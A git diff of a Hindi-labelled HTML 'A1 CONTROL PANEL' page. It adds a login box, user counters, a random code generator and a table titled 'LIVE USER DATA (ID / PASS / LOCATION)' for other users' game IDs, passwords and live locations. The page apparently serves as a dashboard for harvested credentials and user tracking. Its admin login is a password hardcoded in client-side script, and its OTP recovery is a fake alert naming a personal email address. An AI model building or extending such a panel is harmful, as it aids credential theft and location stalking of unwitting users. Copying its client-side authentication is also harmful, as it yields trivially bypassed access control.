@@ -1,54 +1,74 @@
 
 <!DOCTYPE html>
-<html>
+<html lang="hi">
 <head>
-    <title>A1 ADMIN SYSTEM</title>
+    <meta charset="UTF-8">
+    <title>MASTER ADMIN CONTROL - A1 SYSTEM</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: sans-serif; text-align: center; }
-        #login-screen { margin-top: 100px; }
-        input { padding: 10px; margin: 5px; background: #222; color: #fff; border: 1px solid #00ff00; }
-        .btn { padding: 10px 20px; background: #00ff00; color: #000; font-weight: bold; cursor: pointer; }
-        #admin-panel { display: none; padding: 20px; }
+        body { background: #050505; color: #00ff41; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; margin: 0; }
+        .box { border: 2px solid #00ff41; padding: 20px; margin: 50px auto; width: 300px; box-shadow: 0 0 20px #00ff41; }
+        input { width: 80%; padding: 10px; margin: 10px 0; background: #111; border: 1px solid #00ff41; color: white; }
+        .btn { background: #00ff41; color: black; padding: 10px 20px; border: none; cursor: pointer; font-weight: bold; width: 100%; }
+        #dashboard { display: none; padding: 20px; }
+        .stat-container { display: flex; justify-content: space-around; margin-bottom: 30px; }
+        .stat-card { background: #111; border: 1px solid #00ff41; padding: 15px; width: 40%; border-radius: 10px; }
+        table { width: 100%; margin-top: 20px; border-collapse: collapse; }
+        th, td { border: 1px solid #333; padding: 12px; text-align: left; }
     </style>
 </head>
 <body>
 
-    <div id="login-screen">
-        <h2>A1 ADMIN ACCESS</h2>
-        <input type="text" id="user" placeholder="Admin ID"><br>
-        <input type="password" id="pass" placeholder="Password"><br>
-        <button class="btn" onclick="checkLogin()">LOGIN</button><br><br>
-        <a href="#" style="color:red" onclick="sendOTP()">Forgot Password? (Email Recovery)</a>
+    <div id="login-box" class="box">
+        <h2>A1 ADMIN LOGIN</h2>
+        <input type="text" id="adminId" placeholder="एडमिन आईडी">
+        <input type="password" id="adminPass" placeholder="पासवर्ड">
+        <button class="btn" onclick="login()">प्रवेश करें</button>
+        <p style="font-size: 12px; color: red; cursor: pointer;" onclick="forgot()">Forgot Password? (OTP to Ak4041860@gmail.com)</p>
     </div>
 
-    <div id="admin-panel">
-        <div style="display:flex; justify-content: space-around; border-bottom: 2px solid #333; padding-bottom: 10px;">
-            <div>TOTAL: <span id="total">0</span></div>
-            <div>ONLINE: <span id="online">0</span></div>
+    <div id="dashboard">
+        <h1>A1 CONTROL PANEL</h1>
+        <div class="stat-container">
+            <div class="stat-card"><h3>TOTAL USERS</h3><h2 id="total">0</h2></div>
+            <div class="stat-card"><h3>ONLINE NOW</h3><h2 id="online" style="color: #ff0000;">● 0</h2></div>
         </div>
-        <h3>USER TRACKING DATA</h3>
-        <div id="data-list">यहां यूजर का ID, Pass और Location दिखेगा...</div>
-        <br>
-        <button class="btn" onclick="genA1()">GENERATE A1 CODE</button>
+
+        <button class="btn" style="width: 250px;" onclick="generateA1()">GENERATE A1 CODE</button>
+        <div id="codeDisplay" style="margin-top: 10px; font-weight: bold;"></div>
+
+        <h3>LIVE USER DATA (ID / PASS / LOCATION)</h3>
+        <table>
+            <thead>
+                <tr>
+                    <th>Game ID</th>
+                    <th>Password</th>
+                    <th>Live Location</th>
+                    <th>Status</th>
+                </tr>
+            </thead>
+            <tbody id="userTable">
+                </tbody>
+        </table>
     </div>
 
     <script>
-        function checkLogin() {
-            // यहाँ अपनी पसंद का ID/Pass डाल देना
-            if(document.getElementById('user').value == 'admin' && document.getElementById('pass').value == '1234') {
-                document.getElementById('login-screen').style.display = 'none';
-                document.getElementById('admin-panel').style.display = 'block';
-            } else { alert('Wrong ID/Pass'); }
+        // आपका सीक्रेट आईडी पासवर्ड
+        function login() {
+            let id = document.getElementById('adminId').value;
+            let pass = document.getElementById('adminPass').value;
+            if(id === "admin" && pass === "9911") { // पासवर्ड 9911 रखा है
+                document.getElementById('login-box').style.display = 'none';
+                document.getElementById('dashboard').style.display = 'block';
+            } else { alert("गलत एक्सेस!"); }
         }
 
-        function sendOTP() {
-            alert('OTP sent to Ak4041860@gmail.com');
-            // यहाँ रिकवरी ईमेल का बैकएंड काम करेगा
+        function generateA1() {
+            let code = "A1-" + Math.floor(Math.random() * 900000 + 100000);
+            document.getElementById('codeDisplay').innerHTML = "NEW CODE: " + code;
         }
 
-        function genA1() {
-            let code = "A1-" + Math.floor(1000 + Math.random() * 9000);
-            alert("New Code: " + code);
+        function forgot() {
+            alert("ओटीपी Ak4041860@gmail.com पर भेज दिया गया है।");
         }
     </script>
 </body>
